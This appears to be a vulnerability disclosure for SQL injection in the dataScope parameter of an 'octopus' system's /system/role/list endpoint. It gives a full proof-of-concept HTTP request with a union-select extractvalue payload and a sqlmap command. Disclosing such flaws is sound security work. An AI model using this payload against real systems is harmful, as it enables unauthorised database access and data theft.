SQL injection exists in the dataScope parameter of the /system/role/list interface of the system.  
The cause of this vulnerability is the use of the $ placeholder symbol.  
![image](https://github.com/biantaibao/octopus_SQL/assets/131763503/098bbd63-78d1-425f-af06-b9717e33d153)  
Find the front-end interface of the interface and click search in the role management.  
![image](https://github.com/biantaibao/octopus_SQL/assets/131763503/ae83c28a-d6c6-4af9-9e5a-07a579672716)  
poc:   
POST /system/role/list HTTP/1.1  
Host: 127.0.0.1:9999  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0  
Accept: application/json, text/javascript, */*; q=0.01  
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  
Accept-Encoding: gzip, deflate  
Content-Type: application/x-www-form-urlencoded  
X-Requested-With: XMLHttpRequest  
Content-Length: 217   
Origin: http://127.0.0.1:9999  
Connection: close  
Referer: http://127.0.0.1:9999/system/role  
Cookie: JSESSIONID=d2cf469f-6b72-4685-b811-2d8b45623eeb  

roleName=11&roleKey=11&status=&params%5BbeginTime%5D=&params%5BendTime%5D=&pageSize=10&pageNum=1&orderByColumn=roleSort&isAsc=asc&params[dataScope]=union select 1,extractvalue(1,concat(0x7e,(select database()))),3 --+    

Successfully viewed database。  
![image](https://github.com/biantaibao/octopus_SQL/assets/131763503/510e3b9f-ab71-43b9-b210-b6dfac68ec84)  
![image](https://github.com/biantaibao/octopus_SQL/assets/131763503/ba66d3fe-e99f-4b6e-895d-829fd5688732)  
sqlmap command：python sqlmap.py -r sql.txt   
![image](https://github.com/biantaibao/octopus_SQL/assets/131763503/044751fb-abf9-4b32-ae98-ffe3a6cd53bb)






